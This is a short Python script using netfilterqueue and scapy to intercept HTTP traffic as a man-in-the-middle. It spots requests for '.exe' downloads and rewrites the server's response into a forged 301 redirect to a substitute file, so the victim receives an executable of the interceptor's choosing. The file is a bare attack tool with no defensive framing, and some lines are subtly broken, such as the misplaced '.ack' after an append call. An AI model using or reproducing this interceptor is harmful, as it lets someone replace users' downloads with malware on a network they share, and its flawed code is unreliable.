#!/usr/bin/env python

import netfilterqueue
import scapy.all as scapy

ack_list = []

my_file_location = ""

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == 80:
            print("HTTP Request")
            if ".exe" in scapy_packet[scapy.Raw].load:
                print("[+] EXE file found!")
                ack_list.append(scapy_packet[scapy.TCP]).ack

        elif scapy_packet[scapy.TCP].sport == 80:
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print("HTTP Response - Replacing File")
                scapy_packet[scapy.Raw].load = "HTTP/1.1 301 Moved Permanently\nLocation: " + my_file_location + "\n"
                del scapy_packet[scapy.IP].len
                del scapy_packet[scapy.IP].cksum
                del scapy_packet[scapy.TCP].cksum
                packet.set_payload(str(scapy_packet))

    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()